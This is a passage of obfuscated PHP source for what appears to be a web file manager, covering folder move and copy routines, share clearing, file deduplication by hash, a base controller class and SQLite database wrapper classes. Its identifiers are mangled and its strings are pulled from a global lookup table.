Model($‡¶ΣΎ“κ[233])->linkAdd($ΐΉβ‘λ[$‡¶ΣΎ“κ[637]]); if ($Ίιαό‘  && $‚™ζυ΄Ό && $ΐΉβ‘λ[$‡¶ΣΎ“κ[668]]) { $Ι’ΔΔ‚ = $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[488]] == $‡¶ΣΎ“κ[91] ? $this->_childrenListSelect($Πζ£Σν) : !1; $­Ϋ‘¬ί = $Ι’ΔΔ‚ && count($Ι’ΔΔ‚) > 0 ? !0 : !1; $this->removeNow($Πζ£Σν, $­Ϋ‘¬ί); } $this->lockMoveEnd($Πζ£Σν); $this->lockWriteEnd($’κΗθΪ, $»›ήΦ‚ά); $this->folderSizeReset($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[193]]); $this->folderSizeReset($’κΗθΪ); $ψϊσΡ΅ = array($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[193]], $’κΗθΪ); if ($ήΤ–†ΩΝ[$‡¶ΣΎ“κ[488]] == $‡¶ΣΎ“κ[91]) { $ψϊσΡ΅[] = $Πζ£Σν; } $this->updateModifyTime($ψϊσΡ΅); Model($‡¶ΣΎ“κ[641])->eventMove($Πζ£Σν, $ήΤ–†ΩΝ[$‡¶ΣΎ“κ[193]], $’κΗθΪ); Hook::trigger($‡¶ΣΎ“κ[667], $”“·σ†); return $Ίιαό‘ ; } private function _move($†ΤΔΛ¨, $ξΦι—ΐ, $¬ΛόΌφ , &$ΩζΚό¤–, $ομΖ  = '') { $ ―ψΞΞί =& $_SERVER[γγάψ½]; $οίΕχ = $this->sourceInfo($†ΤΔΛ¨); $Α·›ΘΓ = $οίΕχ[$ ―ψΞΞί[488]] == $ ―ψΞΞί[91]; $¨γΒφµ© = $ομΖ  ? $ομΖ  : $οίΕχ[$ ―ψΞΞί[32]]; $ΣΨα = $this->fileNameExistAuto($ξΦι—ΐ, $οίΕχ); $this->lockMoveStart($†ΤΔΛ¨); $this->lockWriteStart($ξΦι—ΐ, $¨γΒφµ©); if (!$ΣΨα) { return $this->_moveForce($†ΤΔΛ¨, $ξΦι—ΐ, $¨γΒφµ©); } $”¥ίΛΔ½ = $ΣΨα; $ϊ΄ΘΛΟΝ = !1; if ($Α·›ΘΓ) { if ($¬ΛόΌφ  == REPEAT_RENAME_FOLDER) { $¨γΒφµ© = $this->fileNameAuto($ξΦι—ΐ, $¨γΒφµ©, $¬ΛόΌφ , $Α·›ΘΓ); $”¥ίΛΔ½ = $this->_moveForce($†ΤΔΛ¨, $ξΦι—ΐ, $¨γΒφµ©); } else { $ΎΌαννΜ = $this->_childrenListSelect($†ΤΔΛ¨); foreach ($ΎΌαννΜ as $¶–¤„ΏΒ) { $Γ›‘Α = REPEAT_REPLACE; $this->_move($¶–¤„ΏΒ[$ ―ψΞΞί[194]], $ΣΨα, $Γ›‘Α, $ΩζΚό¤–); } $ϊ΄ΘΛΟΝ = !0; } } else { if ($¬ΛόΌφ  == REPEAT_RENAME || $¬ΛόΌφ  == REPEAT_RENAME_FOLDER) { $¨γΒφµ© = $this->fileNameAuto($ξΦι—ΐ, $¨γΒφµ©, $¬ΛόΌφ , $Α·›ΘΓ); $”¥ίΛΔ½ = $this->_moveForce($†ΤΔΛ¨, $ξΦι—ΐ, $¨γΒφµ©); } else { $χφ¤φΓ™ = $this->sourceInfoCache($ΣΨα); $γΒϊμΌσ = $this->fileHistory($χφ¤φΓ™, $οίΕχ[$ ―ψΞΞί[546]], $οίΕχ[$ ―ψΞΞί[79]]); if ($γΒϊμΌσ) { $ΩζΚό¤–[$ ―ψΞΞί[637]][] = $οίΕχ[$ ―ψΞΞί[546]]; } $ϊ΄ΘΛΟΝ = !0; } } if ($ϊ΄ΘΛΟΝ) { $ΩζΚό¤–[$ ―ψΞΞί[668]] = !0; } return $”¥ίΛΔ½; } private function _moveForce($Μυ™ , $™ύΞƒυ, $¬ΑΦ΄Υι) { $ωγμΪΘ =& $_SERVER[γγάψ½]; $ΎΣΪν‚έ = $this->sourceInfo($Μυ™ ); $ωνΒ’ψ = $this->sourceInfo($™ύΞƒυ); $¦ΧΆΣά = $ΎΣΪν‚έ[$ωγμΪΘ[488]] == $ωγμΪΘ[91]; $²–ρΎ« = array($ωγμΪΘ[480] => $ωνΒ’ψ[$ωγμΪΘ[194]], $ωγμΪΘ[660] => $ωνΒ’ψ[$ωγμΪΘ[589]] . $ωνΒ’ψ[$ωγμΪΘ[194]] . $ωγμΪΘ[50], $ωγμΪΘ[656] => $ωνΒ’ψ[$ωγμΪΘ[191]], $ωγμΪΘ[657] => $ωνΒ’ψ[$ωγμΪΘ[574]], $ωγμΪΘ[659] => USER_ID, $ωγμΪΘ[497] => $¬ΑΦ΄Υι); $μόΗ ‚ = $ΎΣΪν‚έ[$ωγμΪΘ[191]] == SourceModel::TYPE_GROUP && $ωνΒ’ψ[$ωγμΪΘ[191]] == SourceModel::TYPE_GROUP && $ΎΣΪν‚έ[$ωγμΪΘ[574]] == $ωνΒ’ψ[$ωγμΪΘ[574]]; if (!$μόΗ ‚ && $this->moveClearAuth) { Model($ωγμΪΘ[572])->authClear($Μυ™ ); } $Ϋ–΄ύ— = $ΎΣΪν‚έ[$ωγμΪΘ[508]] == $ωγμΪΘ[91] && $ωνΒ’ψ[$ωγμΪΘ[508]] != $ωγμΪΘ[91]; if ($Ϋ–΄ύ—) { $²–ρΎ«[$ωγμΪΘ[507]] = 0; } if ($¦ΧΆΣά) { $ϊλΰζ†Α = array($ωγμΪΘ[660] => array($ωγμΪΘ[620], $ΎΣΪν‚έ[$ωγμΪΘ[589]] . $ΎΣΪν‚έ[$ωγμΪΘ[194]] . $ωγμΪΘ[621])); $λέ–χ = $ΎΣΪν‚έ[$ωγμΪΘ[589]] . $ΎΣΪν‚έ[$ωγμΪΘ[194]] . $ωγμΪΘ[50]; $ΒΖέΰ = $ωνΒ’ψ[$ωγμΪΘ[589]] . $ωνΒ’ψ[$ωγμΪΘ[194]] . $ωγμΪΘ[50] . $ΎΣΪν‚έ[$ωγμΪΘ[194]] . $ωγμΪΘ[50]; $‚Ϊώσρ = array($ωγμΪΘ[660] => array($ωγμΪΘ[669], "\x72\x65\x70\154\141\143\x65\x28\160\141\x72\145\156\x74\x4c\x65\166\x65\x6c\x2c\x27{$λέ–χ}\x27\54\x27{$ΒΖέΰ}\x27\x29"), $ωγμΪΘ[656] => $ωνΒ’ψ[$ωγμΪΘ[191]], $ωγμΪΘ[657] => $ωνΒ’ψ[$ωγμΪΘ[574]]); if ($Ϋ–΄ύ—) { $‚Ϊώσρ[$ωγμΪΘ[507]] = 0; } $this->where($ϊλΰζ†Α)->data($‚Ϊώσρ)->save(); } $this->where(array($ωγμΪΘ[494] => $Μυ™ ))->data($²–ρΎ«)->save(); return $Μυ™ ; } private function clearShare($―μύΜ―Λ, $¥γαϊύ‘) { $δδΣΒλΧ =& $_SERVER[γγάψ½]; $‰ΙΤµϊ = $this->sourceInfo($―μύΜ―Λ); $Πΐ‘¬‰Μ = $this->sourceInfo($¥γαϊύ‘); if ($‰ΙΤµϊ[$δδΣΒλΧ[574]] == $Πΐ‘¬‰Μ[$δδΣΒλΧ[574]] && $‰ΙΤµϊ[$δδΣΒλΧ[191]] == $δδΣΒλΧ[670]) { return; } $³φ‚ = array($δδΣΒλΧ[589] => array($δδΣΒλΧ[620], $‰ΙΤµϊ[$δδΣΒλΧ[589]] . $―μύΜ―Λ . $δδΣΒλΧ[621])); $Έ‹•χ = $this->field($δδΣΒλΧ[494])->where($³φ‚)->getField($δδΣΒλΧ[194], !0); if (!$Έ‹•χ) { return; } $³φ‚ = array($δδΣΒλΧ[194] => array($δδΣΒλΧ[7], $Έ‹•χ), $δδΣΒλΧ[671] => 1); $€¨€ = Model($δδΣΒλΧ[672])->field($δδΣΒλΧ[673])->where($³φ‚)->select(); if (!$€¨€) { return; } $€¨€ = array_to_keyvalue($€¨€, $δδΣΒλΧ[12], $δδΣΒλΧ[673]); $³φ‚ = array($δδΣΒλΧ[673] => array($δδΣΒλΧ[7], $€¨€)); Model($δδΣΒλΧ[672])->where($³φ‚)->save(array($δδΣΒλΧ[671] => 0)); Model($δδΣΒλΧ[674])->where($³φ‚)->delete(); } public function copyFolderFromIO($‹ξΏ΄¦, $³ιΚΤ·, $»Ϊσ„Μµ, $›€¬ζΡ°, $πΎΖΐ―‡, $―ΥΝΧΑ = false) { $Μ—ιηΊ‹ =& $_SERVER[γγάψ½]; $¦οώΈέ = array($Μ—ιηΊ‹[638] => array(), $Μ—ιηΊ‹[639] => array(), $Μ—ιηΊ‹[637] => array(), $Μ—ιηΊ‹[675] => array()); $ΠΛΛΡ„Γ = $―ΥΝΧΑ ? $―ΥΝΧΑ : $‹ξΏ΄¦->pathThis($³ιΚΤ·); $—αΨΫι = $this->fileNameExist($»Ϊσ„Μµ, $ΠΛΛΡ„Γ); $­Χ­Ύή± = $this->mkdir($»Ϊσ„Μµ, $ΠΛΛΡ„Γ, $›€¬ζΡ°); if (!$—αΨΫι || $›€¬ζΡ° == REPEAT_RENAME_FOLDER) { $›€¬ζΡ° = !1; } if ($—αΨΫι) { $this->_childrenAllMake($—αΨΫι); } Hook::trigger($Μ—ιηΊ‹[676]); $ο―ΏΥ = KodIO::ioFileDriverGet($Μ—ιηΊ‹[486] . $»Ϊσ„Μµ . $Μ—ιηΊ‹[405]); $this->_copyChildTo($‹ξΏ΄¦, $³ιΚΤ·, $­Χ­Ύή±, $›€¬ζΡ°, $¦οώΈέ, $πΎΖΐ―‡, $ο―ΏΥ); Hook::trigger($Μ—ιηΊ‹[677]); if ($­Χ­Ύή±) { $this->folderSizeResetChildren($­Χ­Ύή±); } $this->_childrenListClear(); Model($Μ—ιηΊ‹[640])->addAll($¦οώΈέ[$Μ—ιηΊ‹[638]], array(), !0); Model($Μ—ιηΊ‹[641])->eventCopy($­Χ­Ύή±); $this->saveAll($¦οώΈέ[$Μ—ιηΊ‹[639]]); Model($Μ—ιηΊ‹[549])->linkAdd($¦οώΈέ[$Μ—ιηΊ‹[637]]); Model($Μ—ιηΊ‹[549])->remove($¦οώΈέ[$Μ—ιηΊ‹[675]]); $this->folderSizeReset($»Ϊσ„Μµ); $this->updateModifyTime($»Ϊσ„Μµ); return $­Χ­Ύή±; } private function _copyChildTo($›«φ£¦Α, $ΰΎϋ, $μξ§ΔέΊ, $μξφεΊ, &$έώϊ€‚, $βψη›, $‹‰βΙ¥–) { $ΜΪ»»‡ψ =& $_SERVER[γγάψ½]; $€µθ©Η‘ = $this->sourceInfoCache($μξ§ΔέΊ); $Ϋ•ε’Υ· = $›«φ£¦Α->listPath($ΰΎϋ); $Ϋ•ε’Υ· = $Ϋ•ε’Υ· ? $Ϋ•ε’Υ· : array($ΜΪ»»‡ψ[86] => array(), $ΜΪ»»‡ψ[85] => array()); $ƒ®ϊωόΊ = array_merge($Ϋ•ε’Υ·[$ΜΪ»»‡ψ[86]], $Ϋ•ε’Υ·[$ΜΪ»»‡ψ[85]]); $§€ά‚θΆ = $this->_addFiles($›«φ£¦Α, $‹‰βΙ¥–, $Ϋ•ε’Υ·[$ΜΪ»»‡ψ[86]], $βψη›); $†δυΎΛ = array(); foreach ($ƒ®ϊωόΊ as &$’ΥΙ‡ΕΆ) { if (isset($§€ά‚θΆ[$’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[32]]])) { $’ΥΙ‡ΕΆ = $§€ά‚θΆ[$’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[32]]]; } $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[488]] = $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[33]] == $ΜΪ»»‡ψ[78]; $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[489]] = substr(_get($’ΥΙ‡ΕΆ, $ΜΪ»»‡ψ[169], $ΜΪ»»‡ψ[12]), 0, 10); $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[79]] = _get($’ΥΙ‡ΕΆ, $ΜΪ»»‡ψ[79], 0); $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]] = _get($’ΥΙ‡ΕΆ, $ΜΪ»»‡ψ[546], 0); if (!isset($’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[678]]) && $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]]) { $έώϊ€‚[$ΜΪ»»‡ψ[675]][] = $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]]; } if ($μξφεΊ) { $»ϊιυΆ = $this->fileNameExistCache($μξ§ΔέΊ, $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[32]]); if ($»ϊιυΆ) { if ($’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[488]] || $μξφεΊ == REPEAT_SKIP) { continue; } if ($μξφεΊ == REPEAT_REPLACE) { $ƒ³€–ί® = $this->sourceInfoCache($»ϊιυΆ); $ΔΈΕ³’³ = $this->fileHistory($ƒ³€–ί®, $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]], $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[79]]); if ($ΔΈΕ³’³) { $έώϊ€‚[$ΜΪ»»‡ψ[637]][] = $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]]; } continue; } else { if ($μξφεΊ == REPEAT_RENAME) { $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[32]] = $this->fileNameAutoCache($μξ§ΔέΊ, $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[32]], $μξφεΊ, !1); } } } } if (!$’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[488]] && $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]] == 0) { continue; } if (!$’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[488]] && $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]]) { $έώϊ€‚[$ΜΪ»»‡ψ[637]][] = $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[546]]; } $†δυΎΛ[] = $this->_makeItemData($’ΥΙ‡ΕΆ, $€µθ©Η‘, $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[32]]); } unset($’ΥΙ‡ΕΆ); if (!empty($†δυΎΛ)) { $this->addAll($†δυΎΛ); $this->_childrenListSelect($μξ§ΔέΊ); } $ύΉ¶μ—Υ = $this->_childrenList($μξ§ΔέΊ); $ύΉ¶μ—Υ = array_to_keyvalue($ύΉ¶μ—Υ, $ΜΪ»»‡ψ[32]); foreach ($ƒ®ϊωόΊ as $’ΥΙ‡ΕΆ) { $ƒ³€–ί® = $ύΉ¶μ—Υ[$’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[32]]]; $“ς„θψ = $ƒ³€–ί®[$ΜΪ»»‡ψ[194]]; $this->_copyApplyMeta($ƒ³€–ί®, $έώϊ€‚); if ($’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[33]] == $ΜΪ»»‡ψ[78]) { $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[87]] = $›«φ£¦Α->getPathInner($’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[87]]); $this->_copyChildTo($›«φ£¦Α, $’ΥΙ‡ΕΆ[$ΜΪ»»‡ψ[87]], $“ς„θψ, $μξφεΊ, $έώϊ€‚, $βψη›, $‹‰βΙ¥–); } } } private function _addFiles($νƒΓ‘Ψ, $”ΰ•Β¥, $Ύ‰²―Όν, $¬Κψημ§) { $θπ‘Ϋ =& $_SERVER[γγάψ½]; if (!$Ύ‰²―Όν || count($Ύ‰²―Όν) == 0) { return array(); } $ιϋύ­•Ρ = array(); foreach ($Ύ‰²―Όν as &$«’ΞιΫό) { Hook::trigger($θπ‘Ϋ[679], $«’ΞιΫό); $«’ΞιΫό[$θπ‘Ϋ[87]] = $νƒΓ‘Ψ->getPathInner($«’ΞιΫό[$θπ‘Ϋ[87]]); $α©Ϊ”Ί = $νƒΓ‘Ψ->hashSimple($«’ΞιΫό[$θπ‘Ϋ[87]]); $ΚώθΡ“© = $νƒΓ‘Ψ->hashMd5($«’ΞιΫό[$θπ‘Ϋ[87]]); if (strlen($ΚώθΡ“©) > 10 && !isset($ιϋύ­•Ρ[$ΚώθΡ“©])) { $ιϋύ­•Ρ[$ΚώθΡ“©] = array(); } $«’ΞιΫό[$θπ‘Ϋ[680]] = $α©Ϊ”Ί; $«’ΞιΫό[$θπ‘Ϋ[552]] = $ΚώθΡ“©; $ιϋύ­•Ρ[$ΚώθΡ“©][] =& $«’ΞιΫό; if (count($ιϋύ­•Ρ[$ΚώθΡ“©]) > 1) { $«’ΞιΫό[$θπ‘Ϋ[678]] = !0; } Hook::trigger($θπ‘Ϋ[681], $«’ΞιΫό); } unset($«’ΞιΫό); $Υ·Ϊ–όΙ = array($θπ‘Ϋ[552] => array($θπ‘Ϋ[7], array_keys($ιϋύ­•Ρ))); $½“³ = Model($θπ‘Ϋ[682]); $ήή½Σ = $½“³->where($Υ·Ϊ–όΙ)->select(); $ήή½Σ = $ήή½Σ ? $ήή½Σ : array(); foreach ($ήή½Σ as $συΓΩϊ) { if (!isset($ιϋύ­•Ρ[$συΓΩϊ[$θπ‘Ϋ[552]]])) { continue; } $α †ε = $ιϋύ­•Ρ[$συΓΩϊ[$θπ‘Ϋ[552]]]; foreach ($α †ε as &$«’ΞιΫό) { $«’ΞιΫό[$θπ‘Ϋ[546]] = $συΓΩϊ[$θπ‘Ϋ[546]]; $«’ΞιΫό[$θπ‘Ϋ[678]] = !0; } unset($«’ΞιΫό); } $³ΠνγΑσ = array(); foreach ($Ύ‰²―Όν as $¤·’€ƒ) { Hook::trigger($θπ‘Ϋ[683], $¤·’€ƒ); if (isset($¤·’€ƒ[$θπ‘Ϋ[678]]) && $¤·’€ƒ[$θπ‘Ϋ[678]]) { Hook::trigger($θπ‘Ϋ[684], $¤·’€ƒ); continue; } $–ΐύ¶³ή = $νƒΓ‘Ψ->getPathInner($¤·’€ƒ[$θπ‘Ϋ[87]]); $¬΄Ζ»· = $½“³->addFileMake($–ΐύ¶³ή, $”ΰ•Β¥, $¤·’€ƒ[$θπ‘Ϋ[79]], $¤·’€ƒ[$θπ‘Ϋ[680]], $¤·’€ƒ[$θπ‘Ϋ[552]], $¤·’€ƒ[$θπ‘Ϋ[32]], $¬Κψημ§); Hook::trigger($θπ‘Ϋ[684], $¤·’€ƒ); if (!is_array($¬΄Ζ»·)) { continue; } $³ΠνγΑσ[] = $¬΄Ζ»·; } $½“³->addAll($³ΠνγΑσ); $Υ·Ϊ–όΙ = array($θπ‘Ϋ[552] => array($θπ‘Ϋ[7], array_keys($ιϋύ­•Ρ))); $ήή½Σ = $½“³->where($Υ·Ϊ–όΙ)->select(); $ήή½Σ = $ήή½Σ ? $ήή½Σ : array(); foreach ($ήή½Σ as $συΓΩϊ) { if (!isset($ιϋύ­•Ρ[$συΓΩϊ[$θπ‘Ϋ[552]]])) { continue; } $ΐ‘Υ›ϋ– =& $ιϋύ­•Ρ[$συΓΩϊ[$θπ‘Ϋ[552]]]; foreach ($ΐ‘Υ›ϋ– as &$«’ΞιΫό) { $«’ΞιΫό[$θπ‘Ϋ[546]] = $συΓΩϊ[$θπ‘Ϋ[546]]; } unset($«’ΞιΫό); } $½ξ°« = array(); foreach ($Ύ‰²―Όν as $¤Σ‰όέη) { $½ξ°«[$¤Σ‰όέη[$θπ‘Ϋ[32]]] = $¤Σ‰όέη; } return $½ξ°«; } } define($_SERVER[γγάψ½][685], $_SERVER[γγάψ½][686]); $zohgpkucif = $_SERVER[γγάψ½][687]; goto c„ξ±¶; dΥΐƒ›ή‹ΰ: class Controller extends ClassBaseCall { public $in; public $config; public $tpl; public $values; function __construct() { $η—Ϋ¨Β =& $_SERVER[γγάψ½]; global $in, $config; $this->config =& $config; $this->in =& $in; $this->values[$η—Ϋ¨Β[6]] =& $config; $this->values[$η—Ϋ¨Β[7]] =& $in; $this->tpl = TEMPLATE . MOD . $η—Ϋ¨Β[8]; $this->_classObjectID = mt_rand(0, 10000); } public function loadClass($Ω•Ρ†») { if (1 === func_num_args()) { $this->{$Ω•Ρ†»} = new $Ω•Ρ†»(); } else { $°ίΐζ¥ = new ReflectionClass($Ω•Ρ†»); $ψ®¶»ον = func_get_args(); array_shift($ψ®¶»ον); $this->{$Ω•Ρ†»} = $°ίΐζ¥->newInstanceArgs($ψ®¶»ον); } return $this->{$Ω•Ρ†»}; } public function routeBind($Α ΤΠα, $¤ΊΥΒ±χ, $Ά½ΡίΒ = 3) { $οΪ“ΊΎΒ =& $_SERVER[γγάψ½]; $ψΙσΧ² = $this->in[$οΪ“ΊΎΒ[9]]; $Α ΤΠα = str_replace($οΪ“ΊΎΒ[10], $οΪ“ΊΎΒ[11], trim(trim($Α ΤΠα, $οΪ“ΊΎΒ[8]), $οΪ“ΊΎΒ[12])); if (!$Α ΤΠα || count($ψΙσΧ²) <= $Ά½ΡίΒ) { return !1; } $Ρ „Η = !0; $‘®πηΤ§ = explode($οΪ“ΊΎΒ[8], $Α ΤΠα); for ($•Α°›υ = 0; $•Α°›υ < count($‘®πηΤ§); $•Α°›υ++) { if ($‘®πηΤ§[$•Α°›υ] != $ψΙσΧ²[$Ά½ΡίΒ + $•Α°›υ]) { $Ρ „Η = !1; break; } } if (!$Ρ „Η) { return; } call_user_func_array(array($this, $¤ΊΥΒ±χ), array()); } public function routeArgs($Ϊ΄®Ρ³€ = 3) { $Μ™•ΊΔ› = $this->in[$_SERVER[γγάψ½][9]]; if (count($Μ™•ΊΔ›) <= $Ϊ΄®Ρ³€) { return array(); } $Ϊΰ½ΑΖ = array(); for ($¤ΐ±Ξ§’ = $Ϊ΄®Ρ³€; $¤ΐ±Ξ§’ < count($Μ™•ΊΔ›); $¤ΐ±Ξ§’ += 2) { $Ϊΰ½ΑΖ[$Μ™•ΊΔ›[$¤ΐ±Ξ§’]] = $Μ™•ΊΔ›[$¤ΐ±Ξ§’ + 1]; $this->in[$Μ™•ΊΔ›[$¤ΐ±Ξ§’]] = $Μ™•ΊΔ›[$¤ΐ±Ξ§’ + 1]; } return $Ϊΰ½ΑΖ; } protected function assign($ζ­½λί, $•τ±µέ) { $this->values[$ζ­½λί] = $•τ±µέ; } protected function display($‘‚ΏΗ…φ) { ob_end_clean(); extract($this->values); require $this->tpl . $‘‚ΏΗ…φ; } } class DbSqliteBase extends Db { public function __construct($Δ‰΄Ή” = '') { $Ϊςχ’΄ =& $_SERVER[γγάψ½]; if (!extension_loaded($Ϊςχ’΄[13])) { think_exception(think_lang($Ϊςχ’΄[14]) . $Ϊςχ’΄[15]); } if (!empty($Δ‰΄Ή”)) { if (!isset($Δ‰΄Ή”[$Ϊςχ’΄[16]])) { $Δ‰΄Ή”[$Ϊςχ’΄[16]] = 438; } $this->config = $Δ‰΄Ή”; if (empty($this->config[$Ϊςχ’΄[17]])) { $this->config[$Ϊςχ’΄[17]] = array(); } } } public function connect($­€ΗΧƒ = '', $¦Τη’£ω = 0) { $ςξωϋ™ =& $_SERVER[γγάψ½]; if (!isset($this->linkID[$¦Τη’£ω])) { if (empty($­€ΗΧƒ)) { $­€ΗΧƒ = $this->config; } $¶›ƒΆΩ– = !empty($­€ΗΧƒ[$ςξωϋ™[17]][$ςξωϋ™[18]]) ? $­€ΗΧƒ[$ςξωϋ™[17]][$ςξωϋ™[18]] : $this->pconnect; $ΧΗ‰¨ = $¶›ƒΆΩ– ? $ςξωϋ™[19] : $ςξωϋ™[20]; $this->linkID[$¦Τη’£ω] = $ΧΗ‰¨($­€ΗΧƒ[$ςξωϋ™[21]], $­€ΗΧƒ[$ςξωϋ™[16]]); if (!$this->linkID[$¦Τη’£ω]) { think_exception(sqlite_error_string()); } $this->connected = !0; @sqlite_busy_timeout($this->linkID[$¦Τη’£ω], 30000); if (1 != think_config($ςξωϋ™[22])) { unset($this->config); } } return $this->linkID[$¦Τη’£ω]; } public function free() { $this->queryID = null; } public function query($’ς•ΪΟΓ) { $ΖΩ Οξ =& $_SERVER[γγάψ½]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $’ς•ΪΟΓ; if ($this->queryID) { $this->free(); } think_action_status($ΖΩ Οξ[23], 1); think_status($ΖΩ Οξ[24]); $this->queryID = sqlite_query($this->_linkID, $’ς•ΪΟΓ); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = sqlite_num_rows($this->queryID); $¨ΫηΕδ = $this->getAll(); return $¨ΫηΕδ; } } public function execute($¥ΘΟηόΊ) { $Β²Β«“ =& $_SERVER[γγάψ½]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¥ΘΟηόΊ; if ($this->queryID) { $this->free(); } think_action_status($Β²Β«“[25], 1); think_status($Β²Β«“[24]); $α°€δΗ = sqlite_exec($this->_linkID, $¥ΘΟηόΊ); $this->debug(); if (!1 === $α°€δΗ) { $this->error(); return !1; } else { $this->numRows = sqlite_changes($this->_linkID); $this->lastInsID = sqlite_last_insert_rowid($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { sqlite_query($this->_linkID, $_SERVER[γγάψ½][26]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ρ½§‡Ε› = sqlite_query($this->_linkID, $_SERVER[γγάψ½][27]); if (!$ρ½§‡Ε›) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $ΕέΎβ = sqlite_query($this->_linkID, $_SERVER[γγάψ½][28]); if (!$ΕέΎβ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $ζΏ΄¬Α = array(); if ($this->numRows > 0) { for ($†ώ…–›ύ = 0; $†ώ…–›ύ < $this->numRows; $†ώ…–›ύ++) { $ζΏ΄¬Α[$†ώ…–›ύ] = sqlite_fetch_array($this->queryID, SQLITE_ASSOC); } sqlite_seek($this->queryID, 0); } return $ζΏ΄¬Α; } public function getFields($Φύ’‹Ό) { $ΫμΤμΤ =& $_SERVER[γγάψ½]; $‚υΛζΉ§ = $this->query($ΫμΤμΤ[29] . $Φύ’‹Ό . $ΫμΤμΤ[30]); $ωΧ ς• = array(); if ($‚υΛζΉ§) { foreach ($‚υΛζΉ§ as $―Ιμ”Ν => $ΆΆΛάςγ) { $ωΧ ς•[$ΆΆΛάςγ[$ΫμΤμΤ[31]]] = array($ΫμΤμΤ[32] => $ΆΆΛάςγ[$ΫμΤμΤ[31]], $ΫμΤμΤ[33] => $ΆΆΛάςγ[$ΫμΤμΤ[34]], $ΫμΤμΤ[35] => (bool) ($ΆΆΛάςγ[$ΫμΤμΤ[36]] === $ΫμΤμΤ[12]), $ΫμΤμΤ[37] => $ΆΆΛάςγ[$ΫμΤμΤ[38]], $ΫμΤμΤ[39] => strtolower($ΆΆΛάςγ[$ΫμΤμΤ[40]]) == $ΫμΤμΤ[41], $ΫμΤμΤ[42] => strtolower($ΆΆΛάςγ[$ΫμΤμΤ[43]]) == $ΫμΤμΤ[44]); } } return $ωΧ ς•; } public function getTables($³µκΪΪ = '') { $®ΑΦΈλ¦ =& $_SERVER[γγάψ½]; $¦ΊΕΚΪψ = $this->query($®ΑΦΈλ¦[45] . $®ΑΦΈλ¦[46] . $®ΑΦΈλ¦[47]); $…«ΦΧβ£ = array(); foreach ($¦ΊΕΚΪψ as $ζπ©™ => $­ΕΩ¶υ§) { $…«ΦΧβ£[$ζπ©™] = current($­ΕΩ¶υ§); } return $…«ΦΧβ£; } public function close() { if ($this->_linkID) { sqlite_close($this->_linkID); } $this->_linkID = null; } public function error() { $΄†τ›©… =& $_SERVER[γγάψ½]; $¨σΛ‡ΐ = sqlite_last_error($this->_linkID); $this->error = $¨σΛ‡ΐ . $΄†τ›©…[4] . sqlite_error_string($¨σΛ‡ΐ); if ($΄†τ›©…[12] != $this->queryStr) { $this->error .= LNG($΄†τ›©…[48]) . $this->queryStr; } think_trace($this->error, $΄†τ›©…[12], $΄†τ›©…[49]); return $this->error; } public function escapeString($Ω°Έ―‹Ο) { return sqlite_escape_string($Ω°Έ―‹Ο); } public function parseLimit($£ώΣΓΌ³) { $€―ψϊϊ =& $_SERVER[γγάψ½]; $®ώΗϋ„Υ = $€―ψϊϊ[12]; if (!empty($£ώΣΓΌ³)) { $£ώΣΓΌ³ = explode($€―ψϊϊ[50], $£ώΣΓΌ³); if (count($£ώΣΓΌ³) > 1) { $®ώΗϋ„Υ .= $€―ψϊϊ[51] . $£ώΣΓΌ³[1] . $€―ψϊϊ[52] . $£ώΣΓΌ³[0] . $€―ψϊϊ[53]; } else { $®ώΗϋ„Υ .= $€―ψϊϊ[51] . $£ώΣΓΌ³[0] . $€―ψϊϊ[53]; } } return $®ώΗϋ„Υ; } } class DbSqlite3Base extends Db { public function __construct($ξ›¬”Ι― = '') { $εϊ³ΎΖ =& $_SERVER[γγάψ½]; if (!class_exists($εϊ³ΎΖ[54])) { think_exception(think_lang($εϊ³ΎΖ[14]) . $εϊ³ΎΖ[55]); } if (!empty($ξ›¬”Ι―)) { if (!isset($ξ›¬”Ι―[$εϊ³ΎΖ[16]])) { $ξ›¬”Ι―[$εϊ³ΎΖ[16]] = 438; } $this->config = $ξ›¬”Ι―; if (empty($this->config[$εϊ³ΎΖ[17]])) { $this->config[$εϊ³ΎΖ[17]] = array(); } } } public function connect($Ρό€ΰέ = '', $‡ϋκ‚ΨΘ = 0) { $Νμζ―™Ά =& $_SERVER[γγάψ½]; if (!isset($this->linkID[$‡ϋκ‚ΨΘ])) { if (empty($Ρό€ΰέ)) { $Ρό€ΰέ = $this->config; } $this->linkID[$‡ϋκ‚ΨΘ] = new 